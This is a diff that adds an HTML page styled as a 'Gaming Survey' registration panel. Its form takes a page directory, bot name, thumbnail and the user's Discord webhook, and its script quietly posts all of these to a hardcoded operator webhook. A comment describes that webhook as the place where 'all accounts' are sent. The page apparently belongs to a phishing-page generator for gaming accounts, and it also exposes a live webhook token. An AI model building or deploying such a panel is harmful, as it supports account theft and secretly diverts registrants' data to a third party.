@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Registro de Gaming Survey</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Orbitron', sans-serif;
+        }
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            overflow: hidden;
+            color: #ffffff;
+        }
+        .form-container {
+            width: 400px;
+            padding: 30px;
+            background: rgba(20, 20, 20, 0.95);
+            border-radius: 15px;
+            position: relative;
+            overflow: hidden;
+            text-align: center;
+            border: 2px solid #00ffff;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
+            animation: float 6s ease-in-out infinite;
+        }
+        .form-container::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            border-radius: 15px;
+            background: linear-gradient(45deg, #ff0066, #00ffff);
+            opacity: 0.2;
+            filter: blur(15px);
+            z-index: -1;
+        }
+        h1 {
+            font-size: 1.8em;
+            color: #00ffff;
+            margin-bottom: 1em;
+            text-shadow: 0 0 8px #00ffff, 0 0 15px #00ffff;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            font-size: 1em;
+            color: #ff0066;
+            margin-bottom: 5px;
+            display: block;
+            text-shadow: 0 0 3px #ff0066;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 2px solid #333;
+            border-radius: 5px;
+            background: #222;
+            color: #fff;
+            outline: none;
+            font-family: 'Orbitron', sans-serif;
+            transition: border-color 0.3s ease;
+        }
+        .form-group input:focus {
+            border-color: #00ffff;
+            box-shadow: 0 0 8px #00ffff;
+        }
+        .generate-button {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            background: linear-gradient(45deg, #ff0066, #00ffff);
+            color: #fff;
+            font-weight: bold;
+            font-size: 1.1em;
+            transition: all 0.3s ease;
+        }
+        .generate-button:hover {
+            background: linear-gradient(45deg, #00ffff, #ff0066);
+            box-shadow: 0 0 10px #ff0066, 0 0 20px #00ffff, 0 0 30px #ff0066;
+        }
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <h1>Gaming Survey</h1>
+
+        <div class="form-group">
+            <label for="directory">Directory (Nombre de la página)</label>
+            <input type="text" id="directory" placeholder="Nombre de la página">
+        </div>
+
+        <div class="form-group">
+            <label for="botName">Bot Name (Nombre del bot)</label>
+            <input type="text" id="botName" placeholder="Nombre del bot">
+        </div>
+
+        <div class="form-group">
+            <label for="thumbnail">Thumbnail (URL de la imagen)</label>
+            <input type="text" id="thumbnail" placeholder="URL de la imagen">
+        </div>
+
+        <div class="form-group">
+            <label for="webhook">Webhook (URL de Discord)</label>
+            <input type="text" id="webhook" placeholder="Tu webhook de Discord">
+        </div>
+
+        <button class="generate-button" onclick="register()">Generar</button>
+    </div>
+
+    <script>
+        async function register() {
+            const directory = document.getElementById('directory').value;
+            const botName = document.getElementById('botName').value;
+            const thumbnail = document.getElementById('thumbnail').value;
+            const webhook = document.getElementById('webhook').value;
+
+            // Guardar los datos en localStorage
+            localStorage.setItem('botName', botName);
+            localStorage.setItem('webhook', webhook);
+
+            // Webhook fijo donde se enviarán todas las cuentas
+            const mainWebhook = 'https://discord.com/api/webhooks/1303811411276726383/4UjXGwjosOJjT38nVus6udhhdshb7p39T8CMW2Qkjd-FT1ae3VgmuN4IIIA3YtNM3MC0';
+
+            // Crear la estructura para el mensaje que se enviará al webhook principal
+            const messageToMainWebhook = {
+                content: `**# Nuevo registro**\n> :page_facing_up: Datos del Registro\n> Directory\n> ${directory}\n> Bot Name\n> ${botName}\n> Thumbnail\n> ${thumbnail}\n> User Webhook\n> ${webhook}`
+            };
+
+            // Enviar la información al webhook principal
+            await fetch(mainWebhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(messageToMainWebhook)
+            });
+
+            // Crear la estructura para el mensaje que se enviará al webhook del usuario
+            const messageToUserWebhook = {
+                content: `**Nuevo Bot Registrado:**\n> **Bot Name:** ${botName}\n> **Thumbnail:** ${thumbnail}`
+            };
+
+            // Enviar la información al webhook del usuario
+            await fetch(webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(messageToUserWebhook)
+            });
+
+            alert('Registro exitoso. Puedes iniciar sesión con tu Bot Name y Webhook.');
+        }
+    </script>
+</body>
+</html>
